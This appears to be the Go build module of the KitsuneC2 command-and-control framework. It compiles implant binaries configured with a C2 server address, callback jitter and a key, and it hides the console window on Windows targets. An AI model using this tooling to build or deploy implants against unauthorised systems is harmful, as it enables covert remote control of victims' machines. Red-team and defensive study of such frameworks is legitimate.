package builder

import (
	"errors"
	"io/fs"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"text/template"

	implantSource "github.com/benji-k/KitsuneC2"
)

type BuilderConfig struct {
	ImplantOs             string
	ImplantArch           string
	OutputFile            string
	ServerIp              string
	ServerPort            int
	ImplantName           string
	CallbackInterval      int
	CallbackJitter        int
	PublicKey             string
	MaxRegisterRetryCount int
}

// Given a build config, compiles an implant binary and returns the output path.
func BuildImplant(config *BuilderConfig) (string, error) {
	err := initBuilder()
	if err != nil {
		return "", err
	}

	tmpImplantSrc, err := copyImplantSrcToTmpFolder()
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpImplantSrc)

	err = fillImplantConfig(config, filepath.Join(tmpImplantSrc, "implant", "config", "config_template.config"))
	if err != nil {
		return "", err
	}

	err = invokeGoBuild(config, filepath.Join(tmpImplantSrc, "implant"))
	if err != nil {
		return "", err
	}

	return config.OutputFile, nil
}

func initBuilder() error {
	log.Printf("[INFO] builder: Initializing builder")

	return nil
}

// Fills in template values in implant/config/config_template.config, deletes original config.go and replaces it with filled in template
func fillImplantConfig(config *BuilderConfig, configTemplatePath string) error {
	log.Printf("[INFO] builder: Attempting to fill template in file %s.", configTemplatePath)
	tmpl, err := template.New("config_template.config").ParseFiles(configTemplatePath)
	if err != nil {
		return err
	}

	//delete the original config.go file with dev values.
	err = os.Remove(filepath.Join(filepath.Dir(configTemplatePath), "config.go"))
	if err != nil {
		return err
	}

	// Execute the template with the configuration values and write to a new file called config.go
	output, err := os.Create(filepath.Join(filepath.Dir(configTemplatePath), "config.go"))
	if err != nil {
		return err
	}
	defer output.Close()

	err = tmpl.Execute(output, config)
	if err != nil {
		return err
	}

	return nil
}

// Given a directory with valid Go source code (including go.mod), attempts to build the code.
func invokeGoBuild(config *BuilderConfig, SourceDir string) error {
	log.Printf("[INFO] builder: Attemping to build source code at %s.", SourceDir)
	cwd, _ := os.Getwd()
	err := os.Chdir(SourceDir)
	if err != nil {
		log.Printf("[ERROR] builder: Could not access temporary source code at %s.", SourceDir)
		return err
	}
	defer os.Chdir(cwd) //make sure we cd back to the original place we came from

	santizedPath, err := filepath.Abs(config.OutputFile)
	if err != nil {
		return errors.New("not a valid output path")
	}

	ldFlags := "" //this piece of code checks if target is windows, and if so, adds a linker flag that hides the console window
	if config.ImplantOs == "windows" {
		ldFlags = "-ldflags=-s -w -H=windowsgui -extldflags \"-static\""
	} else {
		ldFlags = "-ldflags=-s -w -extldflags \"-static\""
	}

	cmd := exec.Command("go", "build", "-o", santizedPath, ldFlags, ".")
	cmd.Env = append(os.Environ(), "GOOS="+config.ImplantOs, "GOARCH="+config.ImplantArch)
	cmd.Stdout = log.Writer()
	cmd.Stderr = log.Writer()

	log.Printf("[INFO] builder: Executing command: %s %s", cmd.Path, cmd.Args)
	return cmd.Run()
}

// Copies all the files from this repository needed for compilation of the implant into a temporary folder
func copyImplantSrcToTmpFolder() (string, error) {
	log.Printf("[INFO] builder: Attemping to copy implant source code to temporary folder")
	tmpFolder, err := os.MkdirTemp("", "")
	if err != nil {
		return "", err
	}

	fs.WalkDir(implantSource.ImplantFs, ".", func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}

		// Create the destination path in the temp directory
		destPath := filepath.Join(tmpFolder, path)

		if d.IsDir() {
			// If it's a directory, create it
			err := os.MkdirAll(destPath, os.ModePerm)
			if err != nil {
				return err
			}
		} else {
			// If it's a file, copy its content
			content, err := implantSource.ImplantFs.ReadFile(path)
			if err != nil {
				return err
			}

			err = os.WriteFile(destPath, content, os.ModePerm)
			if err != nil {
				return err
			}
		}
		return nil
	})

	fs.WalkDir(implantSource.LibFs, ".", func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}

		// Create the destination path in the temp directory
		destPath := filepath.Join(tmpFolder, path)

		if d.IsDir() {
			// If it's a directory, create it
			err := os.MkdirAll(destPath, os.ModePerm)
			if err != nil {
				return err
			}
		} else {
			// If it's a file, copy its content
			content, err := implantSource.LibFs.ReadFile(path)
			if err != nil {
				return err
			}

			err = os.WriteFile(destPath, content, os.ModePerm)
			if err != nil {
				return err
			}
		}
		return nil
	})
	os.WriteFile(filepath.Join(tmpFolder, "go.mod"), []byte(implantSource.GoMod), os.ModePerm)
	os.WriteFile(filepath.Join(tmpFolder, "go.sum"), []byte(implantSource.GoSum), os.ModePerm)

	return tmpFolder, nil
}
